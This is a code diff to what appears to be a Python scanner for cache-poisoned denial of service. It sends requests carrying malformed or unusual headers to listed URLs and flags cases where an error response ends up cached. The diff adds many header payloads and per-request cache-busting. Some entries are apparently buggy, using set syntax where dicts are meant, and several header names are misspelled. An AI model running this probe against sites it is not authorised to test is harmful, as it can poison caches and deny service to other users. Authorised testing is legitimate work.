@@ -36,10 +36,10 @@ def check_cached(url, s, pk, main_status_code, authent):
                     cache_status = True
 
         if confirmed:
-            print(f"\033[31m └── VULNERABILITY CONFIRMED\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
+            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
             behavior = False
         elif behavior:
-            print(f"\033[33m └── INTERESTING BEHAVIOR\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
+            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
     except Exception as e:
         pass
         #print(f"Error : {e}")
@@ -50,6 +50,7 @@ def get_error(url, s, main_status_code, authent):
     payload_keys = [
     {"xyz": "1"},
     {"(": "1"},
+    {":/": "\\:\\"},
     {"x-timer": "x"*500},
     {"X-Timer": "5000"},
     {"X-Requested-With": "SomeValue"},
@@ -68,6 +69,7 @@ def get_error(url, s, main_status_code, authent):
     {"Content-Encoding": "deflate"},
     {"Upgrade": "toto"},
     {"Proxy-Authorization": "Basic dXNlcjpwYXNzd29yZA=="},
+    {"Proxy-Authenticate": "Basic realm=xxxx"},
     {"Via": "1.1 proxy.example.com"},
     {"DNT": "1"},
     {"Content-Disposition": "invalid_value"},
@@ -90,14 +92,47 @@ def get_error(url, s, main_status_code, authent):
     {"TE": "teapot"},
     {"TE": "foo"},
     {"X-CF-APP-INSTANCE": "xxx:1"},
-    {"X-CF-APP-INSTANCE":"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1"}
+    {"X-CF-APP-INSTANCE":"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1"},
+    {"X_FORWARDED_PROTO", "nohhtps"},
+    {"Cache-Control": "no-cache"},
+    {"If-Modified-Since": "Wed, 21 Oct 2015 07:28:00 GMT"},
+    {"Accept-Language": "xx"},
+    {"Origin": "https://unauthorized-origin.com"},
+    {"From": "user@example.com"},
+    {"Pragme": "toto"},
+    {"Accept-Charset": "Accept-Charset: utf-8, iso-8859-1;q=0.5"},
+    {"DPR": "2.0"},
+    {"Save-Data": "on"},
+    {"Sec-Fetch-Mode": "toto"},
+    {"Sec-Fetch-Site": "toto"},
+    {"Sec-Fetch-User": "toto"},
+    {"Timing-Allow-Origin": "*"},
+    {"Content-DPR": "1.0"},
+    {"Early-Data": "1"},
+    {"NEL": "toto"},
+    {"Reporting-Endpoints": "toto"},
+    {"Feature-Policy", "camera 'none'; microphone 'none'"},
+    {"Clear-Site-Dat": "cache"},
+    {"Expect-CT": "max-age=604800, enforce"},
+    {"Access-Control-Request-Method": "POST"},
+    {"Access-Control-Request-Headers": "X-Custom-Header"},
+    {"Upgrade-Insecure-Requests": "1"},
+    {"Front-End-Https": "toto"},
+    {"Surrogate-Control": "no-store"},
+    {"X-Robots-Tag": "noindex"},
+    {"Service-Worker-Allowed": "/"},
+    {"Cross-Origin-Embedder-Policy": "require-corp"},
+    {"Cross-Origin-Opener-Policy": "same-origin"},
+    {"Cross-Origin-Resource-Policy": "same-origin"},
+    {"Server-Timing": "miss, db;dur=53, app;dur=47.2"},
     ]
     for pk in payload_keys:
+        uri = f"{url}{random.randrange(999)}"
         try:
-            req = s.get(url, headers=pk, verify=False, auth=authent, timeout=10)
+            req = s.get(uri, headers=pk, verify=False, auth=authent, timeout=10)
             if req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                 #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
-                check_cached(url, s, pk, main_status_code, authent)
+                check_cached(uri, s, pk, main_status_code, authent)
         except requests.Timeout:
             #print(f"request timeout {url} {p}")
             pass
@@ -107,6 +142,7 @@ def get_error(url, s, main_status_code, authent):
         except Exception as e:
             #print(f"Error : {e}")
             pass
+        uri = url
 
 
 if __name__ == '__main__':
@@ -116,7 +152,6 @@ if __name__ == '__main__':
     with open(url_file, "r") as urls:
         urls = urls.read().splitlines()
         for url in urls:
-            url = f"{url}?cb={random.randrange(999)}"
             try:
                 req_main = requests.get(url, verify=False, timeout=10)
                 main_status_code = req_main.status_code
